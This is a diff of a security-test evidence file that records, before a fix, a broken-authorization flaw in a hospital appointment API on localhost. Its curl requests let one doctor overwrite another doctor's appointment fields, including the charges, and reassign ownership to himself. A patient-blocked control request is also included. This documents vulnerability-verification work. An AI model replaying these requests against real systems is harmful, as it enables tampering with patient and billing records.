@@ -2,23 +2,25 @@ V-14 Any doctor can rewrite any field of any appointment
 ========================================================
 
 state    : BEFORE the fix
-captured : 2026-09-24T17:36:51Z
+captured : 2026-09-27T05:50:46Z
 branch   : test/it22083500/v11-v15-before-evidence
-commit   : ec2853c
+commit   : 70455f6
 tool     : curl 8.15.0  (real curl, output unedited)
 target   : http://localhost:4000  (disposable in-memory database, localhost only)
 
 Variables used below (values come from security-tests/.tokens.json):
-  DANA=patientToken=<dana's JWT>    DANA_ID=6ab55fac2afa3227fe052584
-  BOBBY=patientToken=<bobby's JWT>  BOBBY_ID=6ab55fac2afa3227fe052580
-  ALPHA=doctorToken=<Dr Alpha's JWT>  ALPHA_ID=6ab55fad2afa3227fe052588   (Dr Beta's id: 6ab55fad2afa3227fe05258b)
-  MED1=6ab55fad2afa3227fe05258e  MED2=6ab55fad2afa3227fe05258f  CART_ID=6ab55fad2afa3227fe052783  APPT_ID=6ab55fad2afa3227fe052785
+  DANA=patientToken=<dana's JWT>    DANA_ID=6ab8aeacfd79007c0ab9acea
+  CAROL=patientToken=<carol's JWT>  CAROL_ID=6ab8aeabfd79007c0ab9ace8
+  BOBBY=patientToken=<bobby's JWT>  BOBBY_ID=6ab8aeabfd79007c0ab9ace6
+  ALPHA=doctorToken=<Dr Alpha's JWT>  ALPHA_ID=6ab8aeacfd79007c0ab9acee   (Dr Beta's id: 6ab8aeacfd79007c0ab9acf1)
+  MED1=6ab8aeacfd79007c0ab9acf4  MED_NEG=521a0f88e1ef0796dbb6a210  MED2=23fffc350e4e8a3e1256caa5  MED4=9776acd405b2164a8e064fdc
+  CART_ID=6ab8aeacfd79007c0ab9aee9  APPT_ID=6ab8aeacfd79007c0ab9aeeb
 
 ------------------------------------------------------------------------------
 Seeded values: patientFirstName "Alice", appointmentCharges "3000", city "Kandy",
-department "Oncology", status "Pending", doctor = Dr Beta.
+department "Oncology", status "Pending", doctor = Dr Beta (6ab8aeacfd79007c0ab9acf1).
 
-Dr Alpha updates Dr Beta's appointment, sending fields other than status:
+ATTACK 1 — Dr Alpha updates Dr Beta's appointment, sending fields other than status:
 $ curl -s -i -X PUT "$BASE/api/v1/appointment/update/$APPT_ID" -H "Cookie: $ALPHA" -H "Content-Type: application/json" -d "{\"status\":\"Accepted\",\"appointmentCharges\":\"1\",\"city\":\"HACKED\",\"department\":\"HACKED-DEPT\",\"patientFirstName\":\"Overwritten\"}"
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -26,11 +28,45 @@ Vary: Origin
 Access-Control-Allow-Credentials: true
 Content-Type: application/json; charset=utf-8
 Content-Length: 543
-ETag: W/"21f-718J4jQMYQR1L4f39oykfM/1f3c"
-Date: Thu, 24 Sep 2026 17:36:51 GMT
+ETag: W/"21f-JvPpy8E8NZq4jyyoIzjlVqZ5dZ8"
+Date: Sun, 27 Sep 2026 05:50:46 GMT
 Connection: keep-alive
 Keep-Alive: timeout=5
 
-{"statusCode":200,"data":{"_id":"6ab55fad2afa3227fe052785","patient":"6ab55fac2afa3227fe05257e","patientFirstName":"Overwritten","patientLastName":"Adams","doctor":"6ab55fad2afa3227fe05258b","doctorFirstName":"Betty","doctorLastName":"Beta","experience":"10 years","appointmentCharges":"1","city":"HACKED","pincode":"20000","appointmentDate":"2026-11-01T00:00:00.000Z","department":"HACKED-DEPT","status":"Accepted","createdAt":"2026-09-24T17:36:45.448Z","updatedAt":"2026-09-24T17:36:51.548Z","__v":0},"message":"Appointment Status Updated!"}
+{"statusCode":200,"data":{"_id":"6ab8aeacfd79007c0ab9aeeb","patient":"6ab8aeabfd79007c0ab9ace4","patientFirstName":"Overwritten","patientLastName":"Adams","doctor":"6ab8aeacfd79007c0ab9acf1","doctorFirstName":"Betty","doctorLastName":"Beta","experience":"10 years","appointmentCharges":"1","city":"HACKED","pincode":"20000","appointmentDate":"2026-11-01T00:00:00.000Z","department":"HACKED-DEPT","status":"Accepted","createdAt":"2026-09-27T05:50:36.491Z","updatedAt":"2026-09-27T05:50:46.634Z","__v":0},"message":"Appointment Status Updated!"}
 
 Every submitted field is in the stored document, on an appointment that belongs to another doctor.
+
+ATTACK 2 — Dr Alpha reassigns the owner to himself, stealing the appointment:
+$ curl -s -i -X PUT "$BASE/api/v1/appointment/update/$APPT_ID" -H "Cookie: $ALPHA" -H "Content-Type: application/json" -d "{\"doctor\":\"$ALPHA_ID\"}"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 543
+ETag: W/"21f-tG3SQLDUjZPz2Mso5kmdxS7PDVE"
+Date: Sun, 27 Sep 2026 05:50:46 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":{"_id":"6ab8aeacfd79007c0ab9aeeb","patient":"6ab8aeabfd79007c0ab9ace4","patientFirstName":"Overwritten","patientLastName":"Adams","doctor":"6ab8aeacfd79007c0ab9acee","doctorFirstName":"Betty","doctorLastName":"Beta","experience":"10 years","appointmentCharges":"1","city":"HACKED","pincode":"20000","appointmentDate":"2026-11-01T00:00:00.000Z","department":"HACKED-DEPT","status":"Accepted","createdAt":"2026-09-27T05:50:36.491Z","updatedAt":"2026-09-27T05:50:46.722Z","__v":0},"message":"Appointment Status Updated!"}
+
+The stored "doctor" is now 6ab8aeacfd79007c0ab9acee (Dr Alpha) instead of 6ab8aeacfd79007c0ab9acf1 (Dr Beta).
+
+CONTROL — a patient (Dana) tries to update it (the role guard that DOES exist)
+$ curl -s -i -X PUT "$BASE/api/v1/appointment/update/$APPT_ID" -H "Cookie: $DANA" -H "Content-Type: application/json" -d "{\"status\":\"Rejected\"}"
+HTTP/1.1 401 Unauthorized
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 62
+ETag: W/"3e-lVli7P0KJmPDEiX1D5TNtDr7oj0"
+Date: Sun, 27 Sep 2026 05:50:46 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"success":false,"message":"Unauthorized - No token provided"}
+
+The patient is blocked, so the missing checks are field-scoping and ownership, not the role.
